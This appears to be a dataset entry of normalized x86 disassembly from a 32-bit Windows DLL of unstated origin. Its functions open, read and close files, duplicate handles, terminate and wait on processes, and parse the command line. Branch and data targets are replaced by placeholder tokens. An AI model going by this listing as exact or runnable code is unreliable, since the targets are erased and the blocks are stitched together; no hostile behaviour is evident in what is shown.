cmovae eax [ esp + 0x70 ]
push 0x0
push 0x2
push ecx
push 0x1
push 0xc0000000
push eax
mov [ esp + 0x54 ] 0x1
mov [ esp + 0x50 ] 0x0
mov [ esp + 0x4c ] 0xc
call [ CreateFileW@IAT ]
mov edi eax
mov [ esp + 0x24 ] edi
cmp edi 0xffffffff
jne r-xdata
call [ GetLastError@IAT ]
push eax
mov eax [ ebx - 0x48 ]
lea ecx [ ebx - 0x48 ]
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007da0
mov esi eax
jmp r-xdata
mov esi [ GetCurrentProcess@IAT ]
lea eax [ esp + 0x20 ]
push 0x2
push 0x1
push 0x0
push eax
call esi
push eax
push edi
call esi
push eax
call [ DuplicateHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push eax
jmp r-xdata
mov [ esp + 0xc28 ] 0x0
lea ecx [ esp + 0xd8 ]
call sub_1003bb90
sub esp 0x18
lea eax [ ebx - 0x2c ]
mov ecx esp
mov [ esp + 0x2c ] esp
push eax
call sub_10003640
mov [ esp + 0xc40 ] 0x6
sub esp 0x18
lea eax [ ebx - 0x44 ]
mov [ esp + 0x48 ] esp
mov ecx esp
push eax
call sub_10003640
mov [ esp + 0xc58 ] 0x7
lea eax [ esp + 0x4c ]
push eax
mov eax [ ebx - 0x10 ]
and eax 0x1
push eax
mov [ esp + 0xc60 ] 0x5
mov ecx edi
mov edx [ esp + 0x58 ]
call sub_10012fb0
add esp 0x38
mov [ esp + 0x14 ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push edi
mov esi eax
call [ CloseHandle@IAT ]
push esi
jmp r-xdata
mov eax [ ebx - 0x48 ]
lea ecx [ ebx - 0x48 ]
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007da0
mov esi [ CloseHandle@IAT ]
push edi
call esi
push [ esp + 0x20 ]
call esi
push [ esp + 0x1c ]
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x18 ] esi
mov [ esp + 0xc28 ] 0x8
test esi esi
je r-xdata
xor eax eax
mov [ esp + 0x80 ] 0x7
mov [ esp + 0x7c ] 0x0
mov [ esp + 0x6c ] ax
push [ esp + 0x6c ]
call j_sub_1003f3e3#2
add esp 0x4
xor esi esi
mov [ esp + 0x1c ] esi
mov ecx [ ebx - 0x48 ]
mov ecx [ ecx + 0x8 ]
add ecx 0xffffffb8
add ecx ebx
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov esi eax
mov [ esp + 0x1c ] eax
jmp r-xdata
push [ esp + 0x14 ]
call [ CloseHandle@IAT ]
push 0x2c
call sub_1003cdeb
add esp 0x4
mov [ esp + 0x18 ] eax
mov [ esp + 0xc28 ] 0xa
test eax eax
je r-xdata
mov ecx 0x1d
call sub_10038420
push [ ebx - 0x14 ]
push eax
lea eax [ esp + 0x7e4 ]
push eax
call sub_1000c340
sub esp 0xc
lea eax [ esp + 0x7f4 ]
mov ecx esp
mov [ esp + 0x30 ] esp
push eax
call sub_10001820
mov [ esp + 0xc40 ] 0x9
mov [ esp + 0xc40 ] 0x5
mov ecx esi
call sub_10007910
push 0x0
push [ esp + 0x18 ]
call [ TerminateProcess@IAT ]
push 0x1770
push [ esp + 0x18 ]
call [ WaitForSingleObject@IAT ]
mov [ esp + 0xc28 ] 0x5
imul eax [ ebx - 0x14 ] 0x3e8
push eax
push [ esp + 0x18 ]
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
xor ecx ecx
mov [ esp + 0x14 ] ecx
push 0x0
sub esp 0x18
mov ecx esp
mov [ esp + 0x30 ] esp
push r--data
call sub_10009370
mov [ esp + 0xc44 ] 0xb
mov [ esp + 0xc44 ] 0xa
mov ecx [ esp + 0x34 ]
call sub_1002b560
mov ecx eax
mov [ esp + 0x14 ] eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push edi
call [ SetFilePointer@IAT ]
push 0x0
lea eax [ esp + 0x1c ]
mov [ esp + 0x1c ] 0x0
push eax
push 0x6c9
lea eax [ esp + 0x118 ]
push eax
push edi
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push edi
mov edi [ CloseHandle@IAT ]
call edi
push [ esp + 0x20 ]
call edi
mov ecx [ esp + 0x14 ]
push 0x1
mov eax [ ecx ]
call [ eax ]
test esi esi
je r-xdata
mov [ esp + 0xc28 ] 0x5
mov eax [ ecx ]
call [ eax + 0x4 ]
test eax eax
jne r-xdata
push edi
mov edi [ CloseHandle@IAT ]
call edi
push [ esp + 0x20 ]
call edi
mov ecx [ esp + 0x2c ]
sub esp 0x18
mov eax esp
mov [ esp + 0x40 ] esp
mov edx [ ecx ]
push eax
call [ edx + 0x14 ]
mov [ esp + 0xc40 ] 0x13
mov [ esp + 0xc40 ] 0x5
mov edi [ esp + 0x34 ]
mov ecx edi
call sub_100190c0
mov ecx [ edi + 0x18 ]
mov [ edi + 0x10 ] 0x3e9
test ecx ecx
je r-xdata
cmp [ esp + 0x18 ] 0x0
je r-xdata
mov eax [ ebx - 0x48 ]
lea ecx [ ebx - 0x48 ]
push 0x0
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007eb0
jmp r-xdata
mov eax [ esi ]
push 0x1
mov ecx [ eax + 0x4 ]
mov eax [ ecx + esi ]
add ecx esi
call [ eax ]
mov eax [ esp + 0x14 ]
mov [ edi + 0x18 ] eax
mov eax [ edi ]
mov esi [ eax + 0x8 ]
add esi edi
jmp r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
xor eax eax
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x50 ] 0x0
mov [ esp + 0x50 ] 0x7
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x3c ] ax
mov [ esp + 0xc28 ] 0xc
sub esp 0x18
mov eax [ esp + 0x30 ]
mov ecx esp
test [ ebx - 0x10 ] 0x2
mov [ esp + 0x40 ] esp
push eax
lea eax [ esp + 0x128 ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
je r-xdata
mov esi eax
mov [ esp + 0xc28 ] 0x3
cmp [ esp + 0x80 ] 0x8
jb r-xdata
call sub_100019e0
mov [ esp + 0xc40 ] 0xf
mov [ esp + 0xc40 ] 0xc
lea ecx [ esp + 0xc0 ]
call sub_1003c060
add esp 0x18
mov [ esp + 0xc28 ] 0x10
lea ecx [ esp + 0x3c ]
push eax
call sub_10003670
mov [ esp + 0xc28 ] 0xc
cmp [ esp + 0xbc ] 0x8
jb r-xdata
call sub_100019e0
mov [ esp + 0xc40 ] 0xd
mov [ esp + 0xc40 ] 0xc
lea ecx [ esp + 0xd8 ]
call sub_1003bfd0
add esp 0x18
mov [ esp + 0xc28 ] 0xe
lea ecx [ esp + 0x3c ]
push eax
call sub_10003670
mov [ esp + 0xc28 ] 0xc
cmp [ esp + 0xd4 ] 0x8
jb r-xdata
xor eax eax
mov [ esp + 0xbc ] 0x7
mov [ esp + 0xb8 ] 0x0
mov [ esp + 0xa8 ] ax
push [ esp + 0xa8 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ esp + 0xd4 ] 0x7
mov [ esp + 0xd0 ] 0x0
mov [ esp + 0xc0 ] ax
jmp r-xdata
push [ esp + 0xc0 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0xc28 ] 0xc
lea ecx [ esp + 0x54 ]
call sub_10001880
mov [ esp + 0xc28 ] 0x5
lea ecx [ esp + 0x3c ]
call sub_100036b0
mov edi [ esp + 0x24 ]
mov [ esp + 0xc28 ] 0xc
cmp [ esp + 0x68 ] 0x10
jb r-xdata
sub esp 0x18
xor eax eax
mov ecx esp
mov [ esp + 0x40 ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ esp + 0x5c ]
push eax
call sub_10003a20
mov [ esp + 0xc40 ] 0x11
mov [ esp + 0xc40 ] 0xc
lea ecx [ esp + 0x6c ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0xc28 ] 0x12
lea eax [ esp + 0x54 ]
mov ecx [ esp + 0x14 ]
cmp [ esp + 0x68 ] 0x10
mov edi [ esp + 0x64 ]
cmovae eax [ esp + 0x54 ]
mov esi [ ecx ]
push edi
push eax
call [ esi + 0xc ]
mov ecx [ esp + 0x1c ]
push eax
call [ esi + 0x10 ]
cmp edi eax
jne r-xdata
mov [ esp + 0x68 ] 0xf
mov [ esp + 0x64 ] 0x0
mov [ esp + 0x54 ] 0x0
mov [ esp + 0xc28 ] 0x5
cmp [ esp + 0x50 ] 0x8
jb r-xdata
push [ esp + 0x54 ]
call j_sub_1003f3e3#2
add esp 0x4
mov edi [ esp + 0x24 ]
xor eax eax
push eax
mov [ esp + 0x40 ] ax
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x1c ]
push eax
push 0x6c9
lea eax [ esp + 0x118 ]
mov [ esp + 0x5c ] 0x7
push eax
push edi
mov [ esp + 0x60 ] 0x0
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
push [ esp + 0x3c ]
call j_sub_1003f3e3#2
add esp 0x4
jmp r-xdata
sub_1000c360
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004ce49
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x405c
call sub_10048ab0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x4058 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4070 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0x10 ] esi
mov eax [ ebp + 0x8 ]
lea ecx [ esp + 0x40 ]
push 0x1
push eax
call sub_100080c0
mov [ esp + 0x4078 ] 0x0
cmp [ esp + 0x48 ] 0x0
je r-xdata
sub esp 0x18
lea edi [ esi - 0x28 ]
mov eax esp
mov [ esp + 0x30 ] esp
mov ecx edi
mov [ esp + 0x34 ] edi
push eax
call sub_10009aa0
mov [ esp + 0x4090 ] 0x2
mov [ esp + 0x4090 ] 0x0
lea ecx [ esp + 0x40 ]
call sub_10007be0
add esp 0x18
mov [ esp + 0x4078 ] 0x3
lea eax [ esp + 0x28 ]
cmp [ esp + 0x3c ] 0x8
push 0x0
cmovae eax [ esp + 0x2c ]
push 0x0
push 0x3
push 0x0
push 0x1
push 0x1
push eax
call [ CreateFileW@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax [ esi - 0x28 ]
lea ecx [ esi - 0x28 ]
mov eax [ eax + 0x8 ]
add ecx eax
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
mov ecx [ esp + 0x44 ]
sub esp 0x18
mov esi esp
mov [ esp + 0x34 ] esp
mov [ esp + 0x28 ] eax
mov ebx edx
mov edi [ ecx ]
push esi
call [ edi + 0x14 ]
mov [ esp + 0x4090 ] 0x1
push ebx
push [ esp + 0x2c ]
mov [ esp + 0x4098 ] 0x0
call sub_10008410
add esp 0x20
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call [ GetLastError@IAT ]
push eax
mov eax [ edi ]
lea ecx [ esi - 0x28 ]
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007da0
mov esi eax
jmp r-xdata
mov [ esp + 0x4078 ] 0xffffffff
mov [ esp + 0x40 ] r--data
mov [ esp + 0x4078 ] 0x8
cmp [ esp + 0x5c ] 0x0
jbe r-xdata
mov eax [ rw-data ]
push 0x2c
mov [ esp + 0x1c ] eax
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x24 ] edi
mov [ esp + 0x4078 ] 0x4
test edi edi
je r-xdata
mov ecx 0xa
call sub_100383b0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov [ esp + 0x4078 ] 0x0
cmp [ esp + 0x3c ] 0x8
jb r-xdata
mov [ esp + 0x4078 ] 0xffffffff
cmp [ esp + 0x60 ] 0x8
jb r-xdata
cmp [ esp + 0x60 ] 0x8
lea eax [ esp + 0x4c ]
cmovae eax [ esp + 0x4c ]
push eax
call [ SetCurrentDirectoryW@IAT ]
xor edi edi
push 0x0
sub esp 0x18
mov ecx esp
mov [ esp + 0x3c ] esp
push [ esp + 0x34 ]
call sub_10009370
mov [ esp + 0x4094 ] 0x5
mov [ esp + 0x4094 ] 0x4
mov ecx edi
call sub_1002b560
mov edi eax
jmp r-xdata
xor eax eax
mov [ esp + 0x3c ] 0x7
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] ax
push [ esp + 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ esp + 0x60 ] 0x7
mov [ esp + 0x4c ] ax
mov eax esi
mov [ esp + 0x5c ] 0x0
mov ecx [ esp + 0x4070 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x4058 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ esp + 0x4c ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
lea eax [ esp + 0x18 ]
mov [ esp + 0x18 ] 0x0
push eax
push 0x4000
lea eax [ esp + 0x70 ]
push eax
push ebx
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push ebx
call [ CloseHandle@IAT ]
mov eax [ esi - 0x28 ]
lea ecx [ esi - 0x28 ]
push 0x0
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007eb0
mov esi eax
jmp r-xdata
mov [ esp + 0x4078 ] 0x3
mov ecx edi
mov eax [ edi ]
call [ eax + 0x4 ]
test eax eax
jne r-xdata
push ebx
call [ CloseHandle@IAT ]
push 0x94
call sub_1003cdeb
mov ebx eax
add esp 0x4
mov [ esp + 0x20 ] ebx
mov [ esp + 0x4078 ] 0x6
test ebx ebx
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
xor ebx ebx
mov ecx [ esi - 0x28 ]
mov ecx [ ecx + 0x8 ]
add ecx 0xffffffd8
add ecx esi
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx ebx
call sub_10018c90
mov ebx eax
jmp r-xdata
mov esi [ esp + 0x10 ]
mov esi [ edi ]
mov ecx edi
push eax
lea eax [ esp + 0x68 ]
push eax
call [ esi + 0xc ]
push eax
mov ecx edi
call [ esi + 0x10 ]
cmp [ esp + 0x14 ] eax
jne r-xdata
mov eax [ ebx ]
mov [ ebx + 0x18 ] edi
mov esi [ eax + 0x8 ]
add esi ebx
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esp + 0x4078 ] 0x3
sub esp 0x18
mov ecx esp
mov [ esp + 0x38 ] esp
xor eax eax
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ esi - 0x24 ]
push eax
call sub_10003a20
mov [ esp + 0x4090 ] 0x7
mov [ esp + 0x4090 ] 0x3
mov ecx ebx
call sub_10018fd0
mov ecx [ ebx + 0x18 ]
test ecx ecx
je r-xdata
mov eax [ edi ]
mov ecx edi
push 0x1
call [ eax ]
push ebx
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x1c ]
push 0x0
mov eax [ ecx ]
mov ecx [ esp + 0x14 ]
add ecx 0xffffffd8
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007eb0
mov esi eax
jmp r-xdata
push 0x0
lea eax [ esp + 0x18 ]
push eax
push 0x4000
lea eax [ esp + 0x70 ]
push eax
push ebx
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
sub_1000c750
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004cef1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x780
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x778 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x790 ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ esp + 0x10 ] edi
mov eax [ ebp + 0x8 ]
lea ecx [ esp + 0x40 ]
push 0x1
push eax
call sub_100080c0
mov [ esp + 0x798 ] 0x0
cmp [ esp + 0x48 ] 0x0
je r-xdata
sub esp 0x18
lea ebx [ edi - 0x2c ]
mov eax esp
mov [ esp + 0x30 ] esp
mov ecx ebx
mov [ esp + 0x3c ] ebx
push eax
call sub_10009aa0
mov [ esp + 0x7b0 ] 0x2
mov [ esp + 0x7b0 ] 0x0
lea ecx [ esp + 0x40 ]
call sub_10007be0
add esp 0x18
mov [ esp + 0x798 ] 0x3
lea eax [ esp + 0x28 ]
cmp [ esp + 0x3c ] 0x8
push 0x0
cmovae eax [ esp + 0x2c ]
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
push eax
call [ CreateFileW@IAT ]
mov esi eax
mov [ esp + 0x14 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ edi - 0x2c ]
lea ecx [ edi - 0x2c ]
mov eax [ eax + 0x8 ]
add ecx eax
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
mov ecx [ esp + 0x44 ]
sub esp 0x18
mov esi esp
mov [ esp + 0x30 ] esp
mov [ esp + 0x28 ] eax
mov ebx edx
mov edi [ ecx ]
push esi
call [ edi + 0x14 ]
mov [ esp + 0x7b0 ] 0x1
push ebx
push [ esp + 0x2c ]
mov [ esp + 0x7b8 ] 0x0
call sub_10008410
add esp 0x20
mov esi eax
jmp r-xdata
mov eax [ edi - 0x10 ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push eax
jmp r-xdata
mov [ esp + 0x798 ] 0xffffffff
mov [ esp + 0x40 ] r--data
mov [ esp + 0x798 ] 0xa
cmp [ esp + 0x5c ] 0x0
jbe r-xdata
cmp eax 0x1
jne r-xdata
mov edx 0x8003
jmp r-xdata
mov eax [ ebx ]
lea ecx [ edi - 0x2c ]
mov [ esp + 0x798 ] 0xffffffff
cmp [ esp + 0x60 ] 0x8
jb r-xdata
cmp [ esp + 0x60 ] 0x8
lea eax [ esp + 0x4c ]
cmovae eax [ esp + 0x4c ]
push eax
call [ SetCurrentDirectoryW@IAT ]
push esi
call [ CloseHandle@IAT ]
push 0x80091002
mov edx 0x8004
call sub_100071f0
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
mov [ esp + 0x3c ] 0x7
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] ax
push [ esp + 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ esp + 0x60 ] 0x7
mov [ esp + 0x4c ] ax
mov eax esi
mov [ esp + 0x5c ] 0x0
mov ecx [ esp + 0x790 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x778 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ esp + 0x4c ]
call j_sub_1003f3e3#2
add esp 0x4
lea ebx [ edi - 0x2c ]
push 0x0
push esi
call [ GetFileSize@IAT ]
xor edi edi
mov [ esp + 0x18 ] eax
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax [ ebx ]
lea ecx [ esp + 0x7c ]
push ecx
mov ecx ebx
call [ eax + 0x8 ]
mov [ esp + 0x798 ] 0x5
mov edx eax
lea ecx [ esp + 0x64 ]
call sub_1003b670
mov [ esp + 0x798 ] 0x7
lea ecx [ esp + 0x7c ]
call sub_10001880
mov eax [ ebx ]
mov ecx ebx
push 0x1
call [ eax ]
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x1c ] esi
mov [ esp + 0x798 ] 0x8
test esi esi
je r-xdata
nop
xor edi edi
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x10 ]
add edx 0xffffffd4
mov ecx [ ecx ]
mov ecx [ ecx + 0x8 ]
add ecx edx
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov edi eax
jmp r-xdata
mov eax [ ebx ]
mov ecx ebx
push 0x1
call [ eax ]
call [ GetLastError@IAT ]
push [ esp + 0x14 ]
mov esi eax
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x24 ]
push esi
mov eax [ ecx ]
mov ecx [ esp + 0x14 ]
add ecx 0xffffffd4
jmp r-xdata
cmp esi [ esp + 0x20 ]
jne r-xdata
mov eax [ edi ]
mov esi [ eax + 0x8 ]
add esi edi
mov [ esp + 0x798 ] 0x3
lea ecx [ esp + 0x64 ]
call sub_10001880
jmp r-xdata
xor esi esi
mov [ esp + 0x798 ] 0x3
lea ecx [ esp + 0x64 ]
call sub_10001880
jmp r-xdata
mov [ esp + 0x798 ] 0x7
sub esp 0x18
lea eax [ esp + 0x7c ]
mov [ esp + 0x34 ] esp
mov ecx esp
push eax
call sub_10003600
mov [ esp + 0x7b0 ] 0x9
mov [ esp + 0x7b0 ] 0x7
mov ecx edi
call sub_1000a260
test edi edi
jne r-xdata
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007da0
mov esi eax
sub esp 0x18
lea eax [ esp + 0xac ]
mov ecx esp
mov [ esp + 0x34 ] esp
push esi
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100019e0
mov [ esp + 0x7b0 ] 0x4
mov eax [ ebx ]
mov [ esp + 0x7b0 ] 0x3
mov ecx ebx
call [ eax + 0x4 ]
test eax eax
je r-xdata
mov [ esp + 0x798 ] 0x0
cmp [ esp + 0x3c ] 0x8
jb r-xdata
mov eax [ esp + 0x18 ]
add edi esi
cmp edi eax
jb r-xdata
sub eax edi
mov [ esp + 0x20 ] 0x0
mov esi 0x6f0
cmp eax esi
push 0x0
cmovb esi eax
lea eax [ esp + 0x24 ]
push eax
push esi
lea eax [ esp + 0xa0 ]
push eax
push [ esp + 0x24 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov esi [ esp + 0x14 ]
sub_1000cb60
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004cf7b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x478
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x470 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x488 ]
mov [ fs : 0x0 ] eax
mov edi ecx
call [ GetCommandLineW@IAT ]
mov edx eax
mov [ esp + 0x5c ] 0x0
xor eax eax
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x60 ] 0x7
mov [ esp + 0x5c ] 0x0
mov [ esp + 0x4c ] ax
cmp [ edx ] ax
jne r-xdata
mov ecx edx
lea esi [ ecx + 0x2 ]
nop
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx esi
sar ecx 0x1
push ecx
push edx
lea ecx [ esp + 0x54 ]
call sub_10009730
mov [ esp + 0x490 ] 0x0
sub esp 0x18
mov ecx esp
mov [ esp + 0x30 ] esp
xor eax eax
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ esp + 0x6c ]
push eax
call sub_10003a20
mov [ esp + 0x4a8 ] 0x1
sub esp 0x18
mov eax esp
mov [ esp + 0x44 ] esp
xor ecx ecx
mov [ eax + 0x14 ] 0x7
mov [ eax + 0x10 ] 0x0
mov [ eax ] cx
mov [ esp + 0x4c0 ] 0x2
lea eax [ esp + 0x44 ]
push eax
push ecx
mov [ esp + 0x4c8 ] cl
xor edx edx
call sub_10012fb0
mov esi eax
add esp 0x38
test esi esi
jne r-xdata
push esi
call [ GetProcessId@IAT ]
push esi
mov ebx eax
call [ CloseHandle@IAT ]
mov [ esp + 0x44 ] 0x0
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] 0x0
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x490 ] 0x3
cmp [ rw-data ] 0x0
mov esi [ InterlockedExchange@IAT ]
jne r-xdata
mov eax [ edi - 0x10 ]
lea ecx [ edi - 0x10 ]
push [ esp + 0x14 ]
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007da0
mov esi eax
jmp r-xdata
mov edx [ rw-data ]
cmp [ edx ] 0x0
jne r-xdata
mov ecx 0x1e
call sub_100382c0
push eax
push rw-data
call esi
mov [ esp + 0x490 ] 0xffffffff
cmp [ esp + 0x60 ] 0x8
jb r-xdata
mov ecx edx
lea eax [ ecx + 0x1 ]
mov [ esp + 0x14 ] eax
xor ecx ecx
jmp r-xdata
xor eax eax
mov [ esp + 0x60 ] 0x7
mov [ esp + 0x4c ] ax
mov eax esi
mov [ esp + 0x5c ] 0x0
mov ecx [ esp + 0x488 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x470 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ esp + 0x4c ]
call j_sub_1003f3e3#2
add esp 0x4
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx [ esp + 0x14 ]
push ecx
push edx
lea ecx [ esp + 0x3c ]
call sub_10005470
sub esp 0x18
xor eax eax
mov ecx esp
mov [ esp + 0x30 ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ esp + 0x6c ]
push eax
call sub_10003a20
mov [ esp + 0x4a8 ] 0x4
mov [ esp + 0x4a8 ] 0x3
lea ecx [ esp + 0x7c ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0x490 ] 0x5
lea ecx [ esp + 0x34 ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x490 ] 0x3
cmp [ esp + 0x78 ] 0x10
jb r-xdata
cmp [ rw-data ] 0x0
mov [ esp + 0x78 ] 0xf
mov [ esp + 0x74 ] 0x0
mov [ esp + 0x64 ] 0x0
jne r-xdata
push [ esp + 0x64 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ rw-data ]
push ebx
push eax
lea eax [ esp + 0x84 ]
push eax
call sub_1000cf80
add esp 0xc
cmp [ esp + 0x7c ] 0x0
jne r-xdata
mov ecx 0x1f
call sub_100382c0
push eax
push rw-data
call esi
lea ecx [ esp + 0x7c ]
lea edx [ ecx + 0x1 ]
lea ecx [ ecx ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0x80 ]
push eax
lea ecx [ esp + 0x3c ]
call sub_10005470
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x18 ] esi
mov [ esp + 0x490 ] 0x6
test esi esi
je r-xdata
xor edi edi
mov ecx [ edi - 0x10 ]
add edi 0xfffffff0
mov ecx [ ecx + 0x8 ]
add ecx edi
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov edi eax
jmp r-xdata
mov [ esp + 0x490 ] 0x3
cmp [ esp + 0x30 ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov [ esp + 0x490 ] 0x3
lea eax [ esp + 0x34 ]
push 0xffffffff
push 0x0
mov [ esp + 0x34 ] 0x0
lea ecx [ esp + 0x24 ]
mov [ esp + 0x38 ] 0x0
push eax
mov [ esp + 0x3c ] 0xf
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] 0x0
call sub_100018b0
mov [ esp + 0x490 ] 0x7
lea ecx [ edi + 0x34 ]
lea eax [ esp + 0x1c ]
cmp ecx eax
je r-xdata
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x1c ] 0x0
test edi edi
jne r-xdata
push [ esp + 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ edi ]
mov esi [ eax + 0x8 ]
add esi edi
xor esi esi
jmp r-xdata
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] 0x0
mov [ esp + 0x34 ] 0x0
push [ esp + 0x34 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x490 ] 0x0
cmp [ esp + 0x48 ] 0x10
jb r-xdata
sub_1000cfa0
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_1003f1e0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi edx
mov [ ebp - 0x4 ] 0x0
call ecx
mov [ esi ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000d020
push ebp
mov ebp esp
push esi
push 0x8007
call [ SetErrorMode@IAT ]
push 0xc
call sub_1003cdeb
mov esi eax
xorps xmm0 xmm0
mov edx esi
lea ecx [ esi + 0x4 ]
movq [ esi ] xmm0
push ecx
lea ecx [ esi + 0x8 ]
mov [ esi + 0x8 ] 0x0
push ecx
mov ecx [ ebp + 0x8 ]
call sub_1000cfa0
add esp 0xc
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1000d070
push ebp
mov ebp esp
push 0xffffffff
push sub_1004cfdd
mov eax [ fs : 0x0 ]
push eax
